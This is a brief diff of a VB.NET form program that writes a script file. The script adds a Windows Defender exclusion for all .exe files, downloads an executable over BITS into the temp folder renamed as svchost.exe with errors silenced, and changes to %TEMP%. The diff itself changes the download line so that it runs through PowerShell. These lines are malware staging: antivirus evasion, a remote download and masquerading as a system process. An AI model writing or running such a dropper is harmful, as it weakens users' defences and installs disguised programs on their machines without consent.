@@ -88,7 +88,7 @@ Public Class Form1
         file.WriteLine("")
         file.WriteLine("powershell.exe -command ""Add-MpPreference -ExclusionExtension .exe """)
         file.WriteLine("")
-        file.WriteLine("Start-BitsTransfer -priority foreground -Source https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe -Destination $Env:TMP\svchost.exe -ErrorAction SilentlyContinue")
+        file.WriteLine("powershell -c Start-BitsTransfer -priority foreground -Source https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe -Destination $Env:TMP\svchost.exe -ErrorAction SilentlyContinue")
         file.WriteLine("")
         file.WriteLine("cd %TEMP%")
         file.WriteLine("")
